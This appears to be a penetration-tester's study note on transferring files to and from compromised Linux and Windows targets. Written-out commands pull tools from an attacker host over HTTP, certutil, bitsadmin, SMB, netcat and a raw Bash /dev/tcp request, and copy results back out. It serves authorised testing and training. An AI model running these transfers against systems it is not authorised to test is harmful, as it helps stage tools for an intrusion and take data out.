# File transfers

[Home](../README.md) · [Shells](Shells.md) · [FTP, SSH and NFS](../01-Enumeration/File-Services.md)

## Choose a reachable transport

Confirm the source and destination, connection direction, listener, route and destination write permissions. Serve only a staging directory. After transfer, compare size and a hash before running a binary.

## HTTP downloads

**Kali / Bash, in the staging directory:**

```bash
python3 -m http.server 8000 --bind <LHOST>
```

**Linux target / Bash:**

```bash
curl -f http://<LHOST>:8000/tool -o /tmp/tool
wget http://<LHOST>:8000/tool -O /tmp/tool
sha256sum /tmp/tool
```

**Windows target / PowerShell:**

```powershell
Invoke-WebRequest -Uri 'http://<LHOST>:8000/tool.exe' -OutFile "$env:TEMP\tool.exe"
(New-Object Net.WebClient).DownloadFile('http://<LHOST>:8000/tool.exe', "$env:TEMP\tool.exe")
Get-FileHash "$env:TEMP\tool.exe" -Algorithm SHA256
```

**Windows target / CMD:**

```batch
certutil -urlcache -split -f http://<LHOST>:8000/tool.exe C:\Users\Public\tool.exe
certutil -hashfile C:\Users\Public\tool.exe SHA256
bitsadmin /transfer transfer_job /download /priority normal http://<LHOST>:8000/tool.exe C:\Users\Public\tool.exe
```

`iwr`/`wget`/`curl` may be PowerShell aliases rather than the native executables. Use full cmdlet names or `curl.exe` when the intended command matters. A successful HTTP status can still deliver an error/login page; inspect the downloaded file.

Other temporary servers in the supplied notes are `php -S <LHOST>:8000`, `ruby -run -e httpd . -p 8000` and `busybox httpd -f -p 8000`. Python 2's `SimpleHTTPServer` is a legacy alternative. A standard Python `http.server` serves downloads; it is not a general upload receiver.

## SMB in either direction

**Kali / Bash:**

```bash
sudo impacket-smbserver tools ./staging -smb2support -username <USER> -password '<PASSWORD>'
```

**Windows target / CMD:**

```batch
net use \\<LHOST>\tools /user:<USER> <PASSWORD>
copy \\<LHOST>\tools\tool.exe C:\Users\Public\tool.exe
copy C:\Users\Public\result.txt \\<LHOST>\tools\result.txt
net use \\<LHOST>\tools /delete
```

Modern clients may reject guest access. Use an explicit account when needed. Reusing an existing SMB connection with conflicting credentials can fail; list mappings with `net use`. Share access and local file permissions both apply.

## SCP

**Kali / Bash:**

```bash
scp -P <SSH_PORT> tool <USER>@<IP>:/tmp/tool
scp -P <SSH_PORT> <USER>@<IP>:/tmp/result.txt ./result.txt
```

Requires SSH access on the remote endpoint. For Windows OpenSSH, use the path syntax accepted by that server and quote paths with spaces. Source examples that mix a Windows path with a Kali username/IP need these endpoints corrected before use.

## Netcat and Socat

**Receiver:**

```bash
nc -lvnp 4444 > received.bin
```

**Sender:**

```bash
nc <RECEIVER_IP> 4444 < source.bin
```

Some implementations remain open after EOF; use their supported close option or stop after verifying the byte count. Avoid PowerShell text pipelines for binary transfers because encoding/conversion can alter bytes.

Socat provides the same basic transfer explicitly:

```bash
# Sender listens; receiver connects.
socat TCP-LISTEN:4444,reuseaddr,fork OPEN:source.bin,rdonly
socat TCP:<SENDER_IP>:4444 OPEN:received.bin,creat,trunc
```

## Text-only and limited-tool paths

Encode binary data to Base64, transport the text and decode to bytes:

```bash
base64 -w0 source.bin > source.b64
base64 -d source.b64 > restored.bin
```

**Windows / PowerShell:**

```powershell
$encoded = [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\path\source.bin'))
[IO.File]::WriteAllBytes('C:\path\restored.bin', [Convert]::FromBase64String($encoded))
```

The source `Get-Content`/UTF-8/`Out-File` example is suitable only for controlled text conversion, not arbitrary binary reconstruction. `exe2hex -x tool.exe -p tool.cmd` creates a reconstruction script; optional UPX packing changes the binary and is not necessary for transport.

If Bash is available without a downloader, `/dev/tcp` can issue a simple unencrypted HTTP request. The original long `__wget` function incorrectly relies on a `Connection: close` header being echoed. A minimal fallback is:

```bash
exec 3<>/dev/tcp/<LHOST>/8000
printf 'GET /file.txt HTTP/1.0\r\nHost: <LHOST>\r\n\r\n' >&3
while IFS= read -r line <&3; do [ "$line" = $'\r' ] && break; done
cat <&3 > file.txt
exec 3>&-
```

This does not implement HTTPS, redirects or chunked decoding. Verify the output. Legacy VBScript downloaders use `WinHttpRequest`/`XMLHTTP` and a binary stream; character-by-character text-file writes can corrupt bytes.

## Upload receivers and other transports

A deliberately configured HTTP upload handler can receive a multipart file, for example from PowerShell's `Net.WebClient.UploadFile`. Confirm that the handler accepts the field name, stores in a writable directory and returns a result you can verify. A download server alone will not accept that request.

FTP requires a server and usable data channel; select binary mode. TFTP requires a TFTP server, an available client and UDP reachability; installing a client package alone does not create a server. Windows syntax is `tftp -i <SERVER> GET file.bin local.bin` or `PUT local.bin`.

The sources mention GPG (`gpg -c file`, `gpg file.gpg`) for encrypting a transferred artifact and dnscat2/iodine for DNS-based transport. They are supplementary techniques with separate receiver/configuration requirements.

## Troubleshooting

Test the same URL or share manually. Check scheme, port, local binding, route, proxy, firewall, credentials, destination directory and available disk space. A directory writable on one Windows version is not guaranteed writable on another; check its ACL. A download-and-execute command also requires script execution to be allowed and is a separate step from transfer.
